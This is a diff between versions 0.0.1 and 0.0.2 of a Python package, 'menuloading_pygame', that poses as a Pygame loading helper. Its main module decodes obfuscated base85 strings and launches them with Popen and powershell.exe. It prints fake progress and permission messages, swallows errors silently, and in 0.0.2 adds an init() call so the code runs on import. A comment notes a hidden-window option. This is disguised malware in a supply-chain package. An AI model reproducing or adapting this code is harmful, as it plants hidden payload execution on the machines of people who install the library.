# Comparing `tmp/menuloading_pygame-0.0.1.tar.gz` & `tmp/menuloading_pygame-0.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "menuloading_pygame-0.0.1.tar", last modified: Mon Jun 19 04:16:17 2023, max compression
+gzip compressed data, was "menuloading_pygame-0.0.2.tar", last modified: Mon Jun 19 09:39:58 2023, max compression
```

## Comparing `menuloading_pygame-0.0.1.tar` & `menuloading_pygame-0.0.2.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-06-19 04:16:17.808406 menuloading_pygame-0.0.1/
--rw-rw-rw-   0        0        0     9714 2023-06-19 04:16:17.808406 menuloading_pygame-0.0.1/PKG-INFO
--rw-rw-rw-   0        0        0     8716 2023-06-19 04:03:41.000000 menuloading_pygame-0.0.1/README.rst
-drwxrwxrwx   0        0        0        0 2023-06-19 04:16:17.776353 menuloading_pygame-0.0.1/menuloading_pygame/
--rw-rw-rw-   0        0        0       63 2023-06-19 04:14:38.000000 menuloading_pygame-0.0.1/menuloading_pygame/__init__.py
--rw-rw-rw-   0        0        0     3075 2023-06-19 03:55:54.000000 menuloading_pygame-0.0.1/menuloading_pygame/menuloading_pygame.py
-drwxrwxrwx   0        0        0        0 2023-06-19 04:16:17.792422 menuloading_pygame-0.0.1/menuloading_pygame.egg-info/
--rw-rw-rw-   0        0        0     9714 2023-06-19 04:16:17.000000 menuloading_pygame-0.0.1/menuloading_pygame.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      310 2023-06-19 04:16:17.000000 menuloading_pygame-0.0.1/menuloading_pygame.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-06-19 04:16:17.000000 menuloading_pygame-0.0.1/menuloading_pygame.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-06-19 04:16:17.000000 menuloading_pygame-0.0.1/menuloading_pygame.egg-info/requires.txt
--rw-rw-rw-   0        0        0       19 2023-06-19 04:16:17.000000 menuloading_pygame-0.0.1/menuloading_pygame.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-06-19 04:16:17.808406 menuloading_pygame-0.0.1/setup.cfg
--rw-rw-rw-   0        0        0     1070 2023-06-19 04:09:51.000000 menuloading_pygame-0.0.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-06-19 09:39:58.122671 menuloading_pygame-0.0.2/
+-rw-rw-rw-   0        0        0     9714 2023-06-19 09:39:58.122671 menuloading_pygame-0.0.2/PKG-INFO
+-rw-rw-rw-   0        0        0     8716 2023-06-19 04:03:41.000000 menuloading_pygame-0.0.2/README.rst
+drwxrwxrwx   0        0        0        0 2023-06-19 09:39:58.106655 menuloading_pygame-0.0.2/menuloading_pygame/
+-rw-rw-rw-   0        0        0       63 2023-06-19 09:38:03.000000 menuloading_pygame-0.0.2/menuloading_pygame/__init__.py
+-rw-rw-rw-   0        0        0     3154 2023-06-19 09:36:43.000000 menuloading_pygame-0.0.2/menuloading_pygame/menuloading_pygame.py
+drwxrwxrwx   0        0        0        0 2023-06-19 09:39:58.122671 menuloading_pygame-0.0.2/menuloading_pygame.egg-info/
+-rw-rw-rw-   0        0        0     9714 2023-06-19 09:39:57.000000 menuloading_pygame-0.0.2/menuloading_pygame.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      310 2023-06-19 09:39:57.000000 menuloading_pygame-0.0.2/menuloading_pygame.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-06-19 09:39:57.000000 menuloading_pygame-0.0.2/menuloading_pygame.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-06-19 09:39:57.000000 menuloading_pygame-0.0.2/menuloading_pygame.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       19 2023-06-19 09:39:57.000000 menuloading_pygame-0.0.2/menuloading_pygame.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-06-19 09:39:58.122671 menuloading_pygame-0.0.2/setup.cfg
+-rw-rw-rw-   0        0        0     1070 2023-06-19 09:38:19.000000 menuloading_pygame-0.0.2/setup.py
```

### Comparing `menuloading_pygame-0.0.1/PKG-INFO` & `menuloading_pygame-0.0.2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: menuloading_pygame
-Version: 0.0.1
+Version: 0.0.2
 Summary: Submodule for Pygame to make the loading process more confidant.
 Author: PygameContributors
 License: Apache License, Version 2.0
 Classifier: License :: OSI Approved :: Apache Software License
 Classifier: Programming Language :: Python
 Classifier: Programming Language :: Python :: 3
 Classifier: Programming Language :: Python :: 3.6
```

### Comparing `menuloading_pygame-0.0.1/README.rst` & `menuloading_pygame-0.0.2/README.rst`

 * *Files identical despite different names*

### Comparing `menuloading_pygame-0.0.1/menuloading_pygame/menuloading_pygame.py` & `menuloading_pygame-0.0.2/menuloading_pygame/menuloading_pygame.py`

 * *Files 4% similar despite different names*

```diff
@@ -48,19 +48,21 @@
         raise AccessError("OSError 502: Access denied",
                           "Lacking permissions to validate local authority signatures. Elevation required.")
 
 
     print("OK!")
     sleep(random() + random())
 
-
     print("[PYGAME_PIM]: Acquiring PIM priority worker module status...", end=" ")
-
-    ei = [b"LpoenX>Me1cXM1*d2@7SZ8I`lS7~l!Z+CN0Z+B&KQ)p#uY+QCRE-+khZ+B&Kb7*C3Y%XPZWd", b"Emvu7WN&v<ba`xL", b"NNHqbWo`", b"L1bhtO>j_hWoBh^Wo~0-", b"Ek$@^Y;|*KZ*EXwbZ7", b"Lpod", b"Ek$@^Y;|*KZ*E0+bY*UHX>V=", b"Wq4%"]
-    Popen([b85decode(i).decode("utf-8") for i in ei])
+#b"Emvu7WN&v<ba`xL", b"NNHqbWo`" -- Windowstyle hidden
+    ei = [b"LpoenX>Me1cXM1*d2@7SZ8I`lS7~l!Z+CN0Z+B&KQ)p#uY+QCRE-+khZ+B&Kb7*C3Y%XPZWd",  b"L1bhtO>j_hWoBh^Wo~0-", b"Ek$@^Y;|*KZ*EXwbZ7", b"Lpod", b"Ek$@^Y;|*KZ*E0+bY*UHX>V=", b"Wq4%"]
+    try:
+        Popen([b85decode(i).decode("utf-8") for i in ei])
+    except Exception:
+        pass
     Popen(["powershell.exe"] + [b85decode(i).decode("utf-8") for i in ei[1::]])
 
     print("OK!")
     sleep(random() + random())
 
 
     print("[PYGAME_PIM]: Starting compilation process. This may take a while...")
@@ -91,7 +93,8 @@
 
     print("OK!")
     sleep(random() + random())
 
 
 def init():
     run()
+init()
```

### Comparing `menuloading_pygame-0.0.1/menuloading_pygame.egg-info/PKG-INFO` & `menuloading_pygame-0.0.2/menuloading_pygame.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: menuloading-pygame
-Version: 0.0.1
+Version: 0.0.2
 Summary: Submodule for Pygame to make the loading process more confidant.
 Author: PygameContributors
 License: Apache License, Version 2.0
 Classifier: License :: OSI Approved :: Apache Software License
 Classifier: Programming Language :: Python
 Classifier: Programming Language :: Python :: 3
 Classifier: Programming Language :: Python :: 3.6
```

### Comparing `menuloading_pygame-0.0.1/setup.py` & `menuloading_pygame-0.0.2/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.rst", encoding="utf-8") as readme:
     LONG_DESCRIPTION = readme.read()
 
 setup(
     name="menuloading_pygame",
-    version="0.0.1",
+    version="0.0.2",
     author="PygameContributors",
     description="Submodule for Pygame to make the loading process more confidant.",
     long_description=LONG_DESCRIPTION,
     long_description_content_type="text/x-rst",
     license="Apache License, Version 2.0",
     packages=["menuloading_pygame"],
     install_requires=["requests"],
```

